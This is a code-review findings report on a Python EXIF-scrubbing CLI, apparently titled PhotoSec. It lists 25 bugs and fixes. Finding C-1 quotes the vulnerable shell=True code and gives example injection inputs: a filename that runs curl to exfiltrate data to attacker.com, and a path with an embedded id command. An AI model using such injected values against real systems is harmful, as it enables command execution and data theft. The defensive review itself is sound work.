# PhotoSec Application Review — Findings

## Executive Summary

PhotoSec is a small Python CLI (v0.3.0) for bulk EXIF scrubbing, file renaming, GPS detection, and image analysis. The application has serious security vulnerabilities that make it unsafe to run against untrusted input: a shell-injection vector in `image_analysis()` allows arbitrary command execution via attacker-controlled filenames or directory paths. Beyond the critical security issue, the codebase contains widespread functional bugs — key features crash on normal inputs, produce nonsense output, or silently do nothing. A total of **25 findings** were identified: 1 Critical, 5 High, 9 Medium, and 10 Low. The top three risks are (1) OS command injection via `shell=True` with unsanitised filenames, (2) unbounded path traversal in `get_dir()`, and (3) `check_geo()` crashing on every non-image file it encounters while also producing semantically wrong GPS output.

---

## Methodology

The review was conducted in six phases matching the planned scope:

1. **Scope & Architecture** — entry points, module structure, packaging.
2. **Security** — shell injection, path traversal, destructive operations, file-handle correctness.
3. **Functional Correctness** — logic bugs, crashes, wrong output, dead code paths.
4. **Robustness** — recursion depth, exception handling, string concatenation for paths.
5. **CLI / UX** — banner rendering, help-text drift, error messages.
6. **Packaging & Dependencies** — `setup.py`, `requirements.txt`, Python version constraints.

**Files inspected:**

- `/home/user/PhotoSec/photoutils.py`
- `/home/user/PhotoSec/PhotoSec/PhotoSec.py`
- `/home/user/PhotoSec/PhotoSec/__init__.py`
- `/home/user/PhotoSec/PhotoSec/__main__.py`
- `/home/user/PhotoSec/setup.py`
- `/home/user/PhotoSec/requirements.txt`
- `/home/user/PhotoSec/README.md`

---

## Findings

### CRITICAL

#### C-1: OS Command Injection via Shell=True with Unsanitised Filenames and Directory Paths

- **File**: `PhotoSec/PhotoSec.py:147–178`
- **Description**: `image_analysis()` builds every `subprocess.run()` call by formatting the target path directly into a shell command string and passing `shell=True`. The variable `arg1` is constructed as `file_path + file` where `file_path` comes from `get_dir()` (raw user input) and `file` is the on-disk filename in the target directory. Because `shell=True` causes the entire string to be interpreted by `/bin/sh`, any shell metacharacters in either component execute arbitrary commands with the privileges of the running process.

  ```python
  # PhotoSec/PhotoSec.py:147,152-153
  arg1 = file_path + file
  e = subprocess.run(["exiftool %s" % (arg1)], shell=True, ...)
  b = subprocess.run(["binwalk %s" % (arg1)], shell=True, ...)
  b = subprocess.run(["file %s" % (arg1)], shell=True, ...)
  b = subprocess.run(["identify %s" % (arg1)], shell=True, ...)
  b = subprocess.run(["pngcheck %s" % (arg1)], shell=True, ...)
  s = subprocess.run(["strings %s" % (arg1)], shell=True, ...)
  ```

- **Impact**: An attacker who can place files in the directory supplied by the user — or who controls the directory path itself — achieves arbitrary code execution. Concrete examples:

  - **Malicious filename**: A file named `evil.jpg; curl http://attacker.com/$(whoami) #` in the target directory causes the shell to execute the `curl` exfiltration command after `exiftool` runs on `evil.jpg`.
  - **Malicious path input**: A user entering `/tmp/imgs/$(id > /tmp/pwned) /` as the directory causes the injected subshell to execute immediately when `arg1` is formed and passed to the shell.

  This is trivially exploitable without any special privileges.

- **Recommendation**: Remove `shell=True` and pass arguments as a proper list. Use `shlex.quote()` as a defence-in-depth measure if a shell string is ever required, but the list form is strongly preferred:

  ```python
  # Safe replacement for every subprocess.run call in image_analysis()
  e = subprocess.run(["exiftool", arg1], text=True, capture_output=True)
  b = subprocess.run(["binwalk", arg1], text=True, capture_output=True)
  b = subprocess.run(["file", arg1], text=True, capture_output=True)
  b = subprocess.run(["identify", arg1], text=True, capture_output=True)
  b = subprocess.run(["pngcheck", arg1], text=True, capture_output=True)
  s = subprocess.run(["strings", arg1], text=True, capture_output=True)
  ```

  Also wrap all six calls in `try/except FileNotFoundError` to handle missing system binaries gracefully (see M-6).

---

### HIGH

#### H-1: Unrestricted Path Traversal in get_dir()

- **File**: `PhotoSec/PhotoSec.py:15–19`
- **Description**: `get_dir()` accepts raw user input and passes it directly to `os.path.join()` anchored at `os.path.dirname(__file__)` (the package directory). However, Python's `os.path.join` discards all preceding components when it encounters an absolute path, and `..` sequences are not normalised before use. Both absolute paths (e.g., `/etc/`) and relative traversal sequences (e.g., `../../etc/`) bypass the intended working directory.

  ```python
  def get_dir(self):
      directory = input("Enter the directory: ")
      file_path = os.path.join(os.path.dirname(__file__), directory)
      return file_path
  ```

- **Impact**: A user can point the tool at any directory on the filesystem. While this is a CLI tool where the user runs it themselves, the design intent is to operate inside a user-specified photo directory; operating on `/etc/`, `/home/other_user/`, or system directories can result in mass file corruption (via `clear_cli()` or `rename_cli()`) or unintended data exposure (via `check_geo()` or `image_analysis()`).

- **Recommendation**: Validate and canonicalise the path before use. Reject paths that resolve outside an allowed root, or at minimum canonicalise with `os.path.realpath()` and warn the user:

  ```python
  def get_dir(self):
      directory = input("Enter the directory: ")
      file_path = os.path.realpath(os.path.join(os.path.dirname(__file__), directory))
      # Optionally enforce a base directory restriction here
      return file_path
  ```

#### H-2: rename_cli() Renames All Files Including Non-Images with No Confirmation

- **File**: `PhotoSec/PhotoSec.py:68–86`
- **Description**: `rename_cli()` iterates every entry in `os.listdir(file_path)` with no extension filter and renames all of them — including hidden files, configuration files, executables, and directories — using a sequential numbering scheme. No confirmation prompt is shown before the destructive operation begins, and there is no dry-run mode.

  ```python
  for file in os.listdir(file_path):
      ext = os.path.splitext(file)[-1]
      os.rename(os.path.join(file_path, file), os.path.join(file_path, name + str(i)) + ext)
      i += 1
  ```

- **Impact**: Targeting a directory that contains non-image files (e.g., a project folder, a home directory) irreversibly renames every file in it. Files without extensions (e.g., `Makefile`, `README`) are silently renamed. This is a data-destruction risk requiring only one mistaken path entry.

- **Recommendation**: Filter to known image extensions before renaming (reuse the `photos` list from `clear_cli()`). Add a confirmation prompt listing the files to be renamed before proceeding, and skip directories explicitly:

  ```python
  photos = ['.jpg', '.jpeg', '.png', '.gif']
  files_to_rename = [f for f in os.listdir(file_path)
                     if os.path.isfile(os.path.join(file_path, f))
                     and os.path.splitext(f)[1].lower() in photos]
  print(f"Will rename {len(files_to_rename)} file(s). Continue? (y/n): ", end='')
  if input().lower() != 'y':
      return
  ```

#### H-3: check_geo() Crashes on Non-Image Files and Iterates All Files Without Extension Filter

- **File**: `PhotoSec/PhotoSec.py:110–131`
- **Description**: `check_geo()` calls `get_photos()` to obtain `file_path`, then immediately re-iterates `os.listdir(file_path)` over **all** files without any extension check. Every file — including text files, binaries, and hidden files — is opened and passed to `exif.Image(f)`. The `exif` library raises an exception (typically `plum.exceptions.UnpackError` or similar) when it receives a non-JPEG/EXIF-formatted file, causing the function to crash mid-run.

  ```python
  for file in os.listdir(file_path):
      with open(file_path + file, 'rb+') as f:
          img = exif.Image(f)   # crashes on non-image files
  ```

- **Impact**: The feature fails entirely if the target directory contains any non-image file. There is no error recovery, so files after the failing one are never checked.

- **Recommendation**: Add an extension filter at the top of the loop (matching the approach already used in `clear_cli()`):

  ```python
  photos = ['.jpg', '.jpeg', '.png', '.gif']
  for file in os.listdir(file_path):
      if not file.lower().endswith(tuple(photos)):
          continue
      with open(os.path.join(file_path, file), 'rb') as f:
          ...
  ```

#### H-4: check_geo() GPS Tuple Concatenation Produces Nonsense Output

- **File**: `PhotoSec/PhotoSec.py:126`
- **Description**: `img.gps_latitude` and `img.gps_longitude` are each tuples of rational numbers (degree, minute, second fractions). Adding them with `+` does not produce a human-readable coordinate — Python's `+` on tuples is concatenation, yielding a single 6-element tuple of raw rational values with no indication of sign, hemisphere, or meaning.

  ```python
  gps_data_l.append(img.gps_latitude + img.gps_longitude)
  # Results in e.g.: (37.0, 46.0, 29.9916, 122.0, 25.0, 9.5568)
  # instead of: 37°46'29.99"N, 122°25'9.56"W
  ```

  Additionally, the counter `i` is incremented in both the `if` and `else` branches (lines 127 and 129), so the "File N:" prefix in the GPS list is unrelated to how many GPS-containing files were actually found — it counts all files iterated.

- **Impact**: The primary output of `check_geo()` is meaningless to users who expect readable coordinates. The file index is also wrong.

- **Recommendation**: Format coordinates properly using the hemisphere flags (`img.gps_latitude_ref`, `img.gps_longitude_ref`) and convert rational tuples to decimal degrees:

  ```python
  def dms_to_decimal(dms, ref):
      degrees, minutes, seconds = dms
      decimal = degrees + minutes / 60 + seconds / 3600
      if ref in ('S', 'W'):
          decimal = -decimal
      return decimal

  lat = dms_to_decimal(img.gps_latitude, img.gps_latitude_ref)
  lon = dms_to_decimal(img.gps_longitude, img.gps_longitude_ref)
  gps_data_l.append(f'LAT: {lat:.6f}, LONG: {lon:.6f}')
  ```

  Also move the GPS-positive counter increment (`i += 1`) to inside the `if '_gps_ifd_pointer' in at:` block only.

#### H-5: image_analysis() Output Directory Hardcoded to os.getcwd() — Breaks Unless CWD is Project Root

- **File**: `PhotoSec/PhotoSec.py:145`
- **Description**: The output path for analysis text files is constructed as `os.getcwd() + '/PhotoSec/ExifData/' + file + '_analysis_.txt'`. This assumes the process working directory is the repository root. If the script is run from any other directory (e.g., `python3 /opt/PhotoSec/photoutils.py` from `/home/user/`), the path resolves to `/home/user/PhotoSec/ExifData/`, which does not exist, causing a `FileNotFoundError` and aborting the entire analysis run.

  ```python
  with open(os.getcwd() + '/PhotoSec/ExifData/' + file + '_analysis_.txt', 'w+') as txt:
  ```

- **Impact**: `image_analysis()` is non-functional unless the user happens to run the script from the project root directory — a constraint not documented anywhere.

- **Recommendation**: Derive the output directory from `__file__` rather than `os.getcwd()`, and create it if it doesn't exist:

  ```python
  output_dir = os.path.join(os.path.dirname(__file__), 'ExifData')
  os.makedirs(output_dir, exist_ok=True)
  output_path = os.path.join(output_dir, file + '_analysis_.txt')
  with open(output_path, 'w+') as txt:
      ...
  ```

---

### MEDIUM

#### M-1: clear_cli() Opens File with br+ Then Re-Opens Same File with wb Inside the With Block — Data Corruption Risk

- **File**: `PhotoSec/PhotoSec.py:96–102`
- **Description**: `clear_cli()` opens the image file with mode `'br+'` (read/write binary), passes the handle to `exif.Image()`, then — while the first `with` block still holds the file open — opens the **same path** again with mode `'wb'` (write binary, truncates immediately) to write the modified data. The outer `with` block still holds the original `br+` handle open and pointing at now-truncated content. On most POSIX systems this works by coincidence because the OS allows multiple open handles to the same inode, but the behaviour is undefined if the `exif` library or OS buffers the first handle. A crash between the two `open()` calls leaves the file truncated to zero bytes (data loss).

  ```python
  with open(file_path + file, 'br+') as f:
      img = exif.Image(f)
      if img.has_exif:
          img.delete_all()
          with open(file_path + file, 'wb') as mf:   # truncates while f still open
              mf.write(img.get_file())
  ```

- **Impact**: Corrupt or zero-byte image files if an exception occurs between file opens. Not atomic — a signal or disk-full error mid-write destroys the original.

- **Recommendation**: Open the file once in `'rb'` mode (read-only), then write atomically using a temporary file and rename:

  ```python
  import tempfile, shutil
  with open(os.path.join(file_path, file), 'rb') as f:
      img = exif.Image(f)
  if img.has_exif:
      img.delete_all()
      with tempfile.NamedTemporaryFile(delete=False, dir=file_path, suffix='.tmp') as tmp:
          tmp.write(img.get_file())
      shutil.move(tmp.name, os.path.join(file_path, file))
  ```

#### M-2: get_photos() Returns Only the First Matching File — Callers Re-Iterate Themselves, Making the Returned Filename Useless

- **File**: `PhotoSec/PhotoSec.py:21–28`
- **Description**: `get_photos()` iterates `os.listdir(file_path)` and returns `(file_path, file)` on the very first image it finds — it stops there. Both `check_geo()` (line 111) and `image_analysis()` (line 138) immediately shadow the returned `file` variable by re-iterating `os.listdir(file_path)` themselves in a new `for file in os.listdir(file_path):` loop. The single filename returned by `get_photos()` is never used after unpacking.

  ```python
  def get_photos(self):
      for file in os.listdir(file_path):
          if file.endswith(tuple(photos)):
              return file_path, file   # returns only the first match
              # rest of directory never iterated

  # In image_analysis():
  file_path, file = Security.get_photos(self)  # 'file' is first image
  for file in os.listdir(file_path):           # 'file' immediately rebound
  ```

  Furthermore, if no image is found, `get_photos()` falls off the end of the function and returns `None`, causing `file_path, file = self.get_photos()` to raise `TypeError: cannot unpack non-iterable NoneType object`.

- **Impact**: `get_photos()` is effectively a `get_dir()` wrapper that masks a `None`-return crash risk. Any directory containing zero image files causes callers to crash.

- **Recommendation**: Remove `get_photos()` and have callers call `get_dir()` directly. Move extension filtering into the caller loops. Add a `None`/empty guard:

  ```python
  file_path = self.get_dir()
  photos = ['.jpg', '.jpeg', '.png', '.gif']
  image_files = [f for f in os.listdir(file_path) if f.lower().endswith(tuple(photos))]
  if not image_files:
      print("No image files found in the specified directory.")
      return
  ```

#### M-3: image_analysis() Opens All Files with exif.Image() Including Non-Image Files — Crash Risk

- **File**: `PhotoSec/PhotoSec.py:140–143`
- **Description**: The loop in `image_analysis()` iterates `os.listdir(file_path)` with no extension filter. Every file, regardless of type, is opened and passed to `exif.Image(f)` at line 143. Non-EXIF files (text files, PDFs, executables) cause `exif.Image()` to raise an exception, aborting analysis for all subsequent files.

  ```python
  for file in os.listdir(file_path)):
      if i < len(os.listdir(file_path)):
          with open(file_path + file, 'br+') as f:
              img = exif.Image(f)   # raises on non-image input
  ```

- **Impact**: Any non-image file in the target directory causes the entire `image_analysis()` run to abort mid-way.

- **Recommendation**: Add the same extension filter used in `clear_cli()` at the top of the loop, or wrap the `exif.Image()` call in a `try/except` to log the error and continue.

#### M-4: continue_q() → main() → continue_q() Mutual Recursion — Stack Overflow on Long Sessions

- **File**: `PhotoSec/PhotoSec.py:37–45, 184–201`
- **Description**: After every operation completes, `continue_q()` (if the user answers `'y'`) calls `Security.main(self)`, which prompts for the next action. If the user then completes another action, `continue_q()` is called again, creating another stack frame. Each interactive operation adds two frames to the call stack. Python's default recursion limit is 1000 frames; after roughly 500 operations the interpreter raises `RecursionError`.

  ```python
  def continue_q(self):
      if choice == 'y':
          Security.main(self)   # calls main, which eventually calls continue_q again

  def main(self):
      # ... calls self.rename_cli() / self.clear_cli() / etc
      # each of which calls self.continue_q() at the end
  ```

  Additionally, `main()` itself calls `self.main()` at line 201 when invalid input is received, adding another recursion layer.

- **Impact**: A power user running more than ~500 operations in one session will experience a Python `RecursionError` crash.

- **Recommendation**: Convert to an iterative loop:

  ```python
  def main(self):
      signal.signal(signal.SIGINT, Security.signal_handler)
      while True:
          m_inp = input("Options: clear EXIF data (c), rename files (r), check for geo data (g), image analysis (a), see usage/get help (h), quit (q): ").lower()
          if m_inp == 'q':
              sys.exit(0)
          elif m_inp == 'r':
              self.rename_cli()
          # ... etc
          else:
              print("Invalid option. Please enter c, r, g, a, h, or q.")
  ```

  Remove `continue_q()` and `print_help()`'s recursive call to `self.main()`.

#### M-5: PhotoSec/__init__.py Calls Security.main() Without an Instance — TypeError on Module-Level start()

- **File**: `PhotoSec/__init__.py:4–5`
- **Description**: The `start()` function in `__init__.py` calls `Security.main()` as an unbound class-method call without passing an instance. `main()` is a regular instance method that uses `self`. This raises `TypeError: Security.main() missing 1 required positional argument: 'self'` when `start()` is called.

  ```python
  def start():
      Security.main()   # missing instance; Security.main(self) requires self
  ```

- **Impact**: Any code path that imports and calls `PhotoSec.start()` crashes immediately.

- **Recommendation**: Instantiate `Security` before calling `main()`:

  ```python
  def start():
      s = Security('PhotoSec')
      s.main()
  ```

#### M-6: No Exception Handling Anywhere — Any Unexpected Error Produces an Unformatted Traceback and Exits

- **File**: `PhotoSec/PhotoSec.py` (entire file)
- **Description**: The codebase contains zero `try/except` blocks. Any of the following routine errors produce a raw Python traceback and terminate the program without cleanup: missing system binary (`exiftool`, `binwalk`, etc.), permission denied on a file, invalid EXIF data in a non-standard JPEG, disk full during write, or a directory that disappears mid-iteration.

- **Impact**: Poor user experience; file writes (in `clear_cli()`) may be left half-complete; the user receives no actionable error message.

- **Recommendation**: At minimum, wrap the body of each public method (`rename_cli`, `clear_cli`, `check_geo`, `image_analysis`) in a `try/except (OSError, PermissionError) as e: print(f"Error: {e}")` block. Wrap `subprocess.run` calls in `try/except FileNotFoundError` to report missing tools. For example at `PhotoSec/PhotoSec.py:152`:

  ```python
  try:
      e = subprocess.run(["exiftool", arg1], text=True, capture_output=True)
  except FileNotFoundError:
      txt.write("exiftool not found — install it with: sudo apt install libimage-exiftool-perl\n")
  ```

#### M-7: Manual String Concatenation for File Paths Instead of os.path.join — Requires Trailing Slash

- **File**: `PhotoSec/PhotoSec.py:96, 116, 142, 145, 147`
- **Description**: Throughout the code, file paths are constructed by string concatenation (`file_path + file`) rather than `os.path.join(file_path, file)`. The print message in `get_dir()` ("Make sure that directory ends with '/'") exists only to paper over this bug. If the user omits the trailing slash, every file open will silently target a path like `/home/user/photosIMG_001.jpg` (no separator) — a file that does not exist — causing `FileNotFoundError` on every iteration.

  ```python
  # PhotoSec/PhotoSec.py:96
  with open(file_path + file, 'br+') as f:    # breaks without trailing slash
  ```

  The same pattern occurs at lines 116, 142, 145, and 147.

- **Impact**: Any user who doesn't read or follow the slash warning gets silent failures or crashes for all file operations.

- **Recommendation**: Replace all `file_path + file` occurrences with `os.path.join(file_path, file)`. Remove the trailing-slash warning from `get_dir()`.

#### M-8: image_analysis() Runs binwalk Twice, Wasting Time and Producing Duplicate Output

- **File**: `PhotoSec/PhotoSec.py:155–166`
- **Description**: `image_analysis()` runs `binwalk` twice in sequence and writes the output under two separate headings both labeled `"BINWALK DATA:"` (lines 155 and 163). The second run is identical to the first and appears to be an inadvertent copy-paste error.

  ```python
  txt.write("\nBINWALK DATA: \n\n")
  b = subprocess.run(["binwalk %s" % (arg1)], shell=True, ...)
  txt.write(b.stdout)
  txt.write("\nFILE DATA: \n\n")
  b = subprocess.run(["file %s" % (arg1)], shell=True, ...)
  txt.write(b.stdout)
  txt.write("\nBINWALK DATA: \n\n")   # duplicate
  b = subprocess.run(["binwalk %s" % (arg1)], shell=True, ...)  # duplicate
  txt.write(b.stdout)
  ```

- **Impact**: Analysis reports contain duplicate `binwalk` output, wasting disk space and doubling the runtime for large directories.

- **Recommendation**: Remove lines 163–166 (the second `binwalk` block). If a different tool was intended for that slot, replace it with the correct command.

#### M-9: signal_handler Defined as Instance Method Without @staticmethod and Without self — Brittle Design

- **File**: `PhotoSec/PhotoSec.py:30–35`
- **Description**: `signal_handler` is defined inside the `Security` class without the `@staticmethod` decorator and without a `self` parameter. Its first parameter `sig` actually receives `self` when called as an instance method, and `frame` receives `sig`. This works only because it is registered via `signal.signal(signal.SIGINT, Security.signal_handler)` (line 186), which passes the unbound function directly — bypassing instance dispatch. If it were ever called as `self.signal_handler(sig, frame)` or registered with an instance, the parameter mapping would be wrong.

  ```python
  def signal_handler(sig, frame):   # missing @staticmethod
      choice = input("Are you sure you want to exit? (y/n): ")
  ```

- **Impact**: Code works by coincidence; any refactor that changes how it is called or registered will silently break the Ctrl-C handler with a confusing bug.

- **Recommendation**: Add `@staticmethod` decorator:

  ```python
  @staticmethod
  def signal_handler(sig, frame):
      choice = input("Are you sure you want to exit? (y/n): ")
      if choice.lower() == 'y':
          sys.exit(0)
  ```

---

### LOW

#### L-1: python -m PhotoSec Is Non-Functional — __main__.py Entirely Commented Out

- **File**: `PhotoSec/__main__.py:1–5`
- **Description**: The entire content of `__main__.py` is commented out. Running `python -m PhotoSec` launches Python, finds no executable code, and exits silently with no output or error message. The README (line 23) documents `python -m PhotoSec` as a supported invocation.

  ```python
  # from PhotoSec import Security
  # if __name__ == '__main__':
  #     img = Security("Utils")
  #     img.main()
  ```

- **Impact**: Users following the README's module invocation instructions see no output and receive no indication of failure.

- **Recommendation**: Uncomment the code in `__main__.py`, or replace it with a call to the `start()` function already defined in `__init__.py` (after fixing M-5):

  ```python
  from PhotoSec import start
  start()
  ```

#### L-2: if parser is not None Always True — Dead Else Branch with Duplicated Instantiation

- **File**: `photoutils.py:28, 47–49`
- **Description**: `argparse.ArgumentParser()` always returns a valid object; it never returns `None`. The `if parser is not None:` guard (line 28) is therefore a tautology, and the `else` branch (lines 47–49) is permanently unreachable dead code.

  ```python
  parser = argparse.ArgumentParser()
  if parser is not None:   # always True
      ...
  else:
      main_start = Security('PhotoSec')   # dead code
      main_start.main()
  ```

- **Impact**: Dead code increases maintenance surface and misleads readers into thinking there is a meaningful fallback path.

- **Recommendation**: Remove the `if/else` wrapper entirely; keep just the body of the `if` block.

#### L-3: setup.py Missing install_requires, entry_points, and Correct License SPDX Identifier

- **File**: `setup.py:1–12`
- **Description**: Three packaging defects:
  1. `install_requires` is absent. Installing the package via pip does not install the `exif` or `plum-py` dependencies automatically.
  2. `entry_points` is absent, so the `photosec` console script advertised conceptually by the README does not exist after installation.
  3. `license='GNU v3'` is not a valid SPDX expression. The correct identifier for the LICENSE file present in the repo (GNU GPL v3) is `'GPL-3.0-only'`.

- **Impact**: Installed package is non-functional without manual `pip install -r requirements.txt`; no `photosec` command is created; metadata is incorrect.

- **Recommendation**:

  ```python
  setup(
      ...
      license='GPL-3.0-only',
      install_requires=['exif==1.3.5', 'plum-py==0.8.2'],
      entry_points={
          'console_scripts': ['photosec=photoutils:start'],
      },
      python_requires='>=3.8',
  )
  ```

#### L-4: requirements.txt Uses Exact Pin (==) for Both Dependencies — Breaks on Newer Python or OS

- **File**: `requirements.txt:1–2`
- **Description**: Both dependencies are pinned with `==` (exact version match): `exif==1.3.5` and `plum-py==0.8.2`. Exact pins prevent pip from resolving compatible updates and may fail to install on newer Python versions or platforms where pre-built wheels for those exact versions are not available.

- **Impact**: Installation may fail on Python 3.11+ or on non-x86 platforms. Security patches in `exif` or `plum-py` are never picked up.

- **Recommendation**: Use compatible-release (`~=`) or minimum-version (`>=`) specifiers with a tested upper bound, e.g., `exif>=1.3.5,<2.0` and `plum-py>=0.8.2,<1.0`.

#### L-5: README Documents Only binwalk and exiftool as External Dependencies — Missing strings, file, identify, pngcheck

- **File**: `README.md:38`, `PhotoSec/PhotoSec.py:134–178`
- **Description**: The README states "Binwalk and exfitool must be installed on the system." However, `image_analysis()` also invokes `strings` (line 177), `file` (line 160), `identify` (line 168), and `pngcheck` (line 172). None of these four tools are mentioned in the README. Note also the typo "exfitool" for "exiftool".

- **Impact**: Users following the README install only two of six required tools and then experience silent failures for four analysis commands (failures are swallowed into the output file without error reporting, due to absence of exception handling — see M-6).

- **Recommendation**: Update the README Requirements section to list all six tools with their package names:

  ```
  - exiftool (libimage-exiftool-perl)
  - binwalk
  - file (part of util-linux / file package)
  - identify (imagemagick)
  - pngcheck
  - strings (binutils)
  ```

  Also fix the "exfitool" typo.

#### L-6: main() Invalid-Input Error Message Lists Only 2 of 5 Valid Options

- **File**: `PhotoSec/PhotoSec.py:200`
- **Description**: When an unrecognised option is entered in `main()`, the error message reads `"Please enter 'r' or 'c'"`. The actual valid options are `c`, `r`, `g`, `a`, and `h` — five options, not two.

  ```python
  else:
      print("Please enter 'r' or 'c'")   # outdated message
      self.main()
  ```

- **Impact**: Users who enter `g`, `a`, or `h` receive a confusing error message that doesn't help them discover the valid options.

- **Recommendation**: Update the message to reflect all valid options, and add `q` for quit as part of the recursion fix (see M-4):

  ```python
  print("Invalid option. Please enter: c (clear), r (rename), g (geo), a (analysis), h (help), q (quit)")
  ```

#### L-7: Banner Uses Backtick Characters for Spacing — Renders Incorrectly in Most Terminals

- **File**: `photoutils.py:9–18`
- **Description**: The ASCII art banner uses backtick (`` ` ``) characters extensively as filler/spacing characters, likely as a workaround for how spaces render in the source editor. In standard terminal output, backticks appear as literal characters, making the banner look noisy and incorrect rather than clean ASCII art.

- **Impact**: Minor cosmetic issue; the banner is the first thing users see.

- **Recommendation**: Replace backtick fillers with actual space characters. Use a raw string or pre-formatted block to preserve alignment.

#### L-8: exit() Used Instead of sys.exit() — Inconsistent and Inappropriate for Library Use

- **File**: `PhotoSec/PhotoSec.py:45`, `photoutils.py` (implicitly)
- **Description**: `continue_q()` uses the built-in `exit()` (line 45) while `signal_handler()` uses `sys.exit(0)` (line 33). The `exit()` built-in is intended for interactive interpreter sessions; `sys.exit()` is the correct form for scripts and library code. Using `exit()` in code that might be imported as a module can behave unexpectedly.

  ```python
  def continue_q(self):
      ...
      else:
          exit()       # should be sys.exit(0)
  ```

- **Recommendation**: Replace `exit()` with `sys.exit(0)` for consistency. `sys` is already imported.

#### L-9: print_help() Ends by Calling self.main() — Adds a Stack Frame on Every Help Lookup

- **File**: `PhotoSec/PhotoSec.py:66`
- **Description**: `print_help()` displays help text and then calls `self.main()` directly (line 66). This is an additional instance of the recursion problem described in M-4. Each time a user types `h` to view help and then continues working, another frame is added to the call stack.

  ```python
  def print_help(self):
      print("Usage: ")
      print(...)
      self.main()   # recurses into main
  ```

- **Impact**: Compounds the stack-depth issue of M-4; every help lookup consumes two extra stack frames.

- **Recommendation**: As part of the iterative-loop refactor in M-4, remove the `self.main()` call from `print_help()` and let the loop in `main()` continue naturally after `print_help()` returns.

#### L-10: No Python Version Constraint in setup.py or README

- **File**: `setup.py:1–12`, `README.md:36`
- **Description**: `setup.py` does not specify `python_requires`. The README notes "This project was built using Python 3.10" but provides no minimum or maximum version constraint, and the package metadata enforces nothing. The `exif` library's behaviour on Python 3.7 or 3.12 is not guaranteed by the pinned versions.

- **Impact**: Users on incompatible Python versions get confusing import or runtime errors rather than a clear "requires Python X.Y+" message at install time.

- **Recommendation**: Add `python_requires='>=3.8'` to `setup.py` (or the tested minimum version) to surface incompatibility at install time rather than at runtime.

---

## Recommended Remediation Order

1. **C-1** — Fix shell injection in `image_analysis()` immediately: replace all `shell=True` subprocess calls with list-form argument passing. This is the single highest-risk issue.
2. **H-1** — Validate and canonicalise paths from `get_dir()`. Add realpath normalisation and optionally restrict to a permitted base directory.
3. **H-2** — Add extension filter and confirmation prompt to `rename_cli()` to prevent mass file renaming.
4. **H-3** — Add extension filter to `check_geo()` loop to prevent crashes on non-image files.
5. **H-4** — Fix GPS coordinate formatting in `check_geo()` to produce human-readable decimal degrees.
6. **H-5** — Fix `image_analysis()` output directory to use `__file__`-relative path and `os.makedirs(exist_ok=True)`.
7. **M-1** — Fix `clear_cli()` to use atomic write (temp file + rename) and open the source file read-only.
8. **M-2** — Eliminate the misleading `get_photos()` function; have callers use `get_dir()` directly with proper `None`/empty guards.
9. **M-3** — Add extension filter to `image_analysis()` loop.
10. **M-4** — Refactor `continue_q()` / `main()` mutual recursion into an iterative `while True` loop.
11. **M-5** — Fix `PhotoSec/__init__.py` `start()` to instantiate `Security` before calling `main()`.
12. **M-6** — Add `try/except` blocks around all file I/O and subprocess calls to provide user-friendly error messages.
13. **M-7** — Replace all `file_path + file` path concatenations with `os.path.join(file_path, file)`.
14. **M-8** — Remove the duplicate `binwalk` invocation at lines 163–166.
15. **M-9** — Add `@staticmethod` to `signal_handler`.
16. **L-1** — Uncomment `__main__.py` to make `python -m PhotoSec` functional.
17. **L-2** — Remove the dead `if parser is not None` branch.
18. **L-3** — Add `install_requires`, `entry_points`, `python_requires`, and correct SPDX license to `setup.py`.
19. **L-4** — Relax exact version pins in `requirements.txt` to compatible-release specifiers.
20. **L-5** — Update README to list all six required external tools and fix the "exfitool" typo.
21. **L-6** — Update the invalid-input error message in `main()` to list all valid options.
22. **L-7** — Fix the ASCII art banner to use space characters instead of backticks.
23. **L-8** — Replace `exit()` with `sys.exit(0)` in `continue_q()`.
24. **L-9** — Remove `self.main()` call from `print_help()` once the iterative loop refactor (M-4) is in place.
25. **L-10** — Add `python_requires` to `setup.py` and a minimum version note to the README.
